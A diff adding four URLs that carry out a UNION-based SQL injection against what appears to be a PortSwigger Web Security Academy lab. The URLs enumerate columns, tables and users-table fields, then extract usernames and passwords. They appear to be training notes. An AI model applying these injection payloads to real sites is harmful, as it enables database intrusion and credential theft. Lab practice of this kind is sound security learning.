@@ -1,0 +1,7 @@
+https://acf11fb91e0ac14580dd736c00eb000c.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,NULL FROM INFORMATION_SCHEMA.TABLES--
+
+https://acf11fb91e0ac14580dd736c00eb000c.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+
+https://acf11fb91e0ac14580dd736c00eb000c.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users_cwlhma'--
+
+https://acf11fb91e0ac14580dd736c00eb000c.web-security-academy.net/filter?category=Gifts' UNION SELECT username_mbznrj,password_lllcjh FROM users_cwlhma --
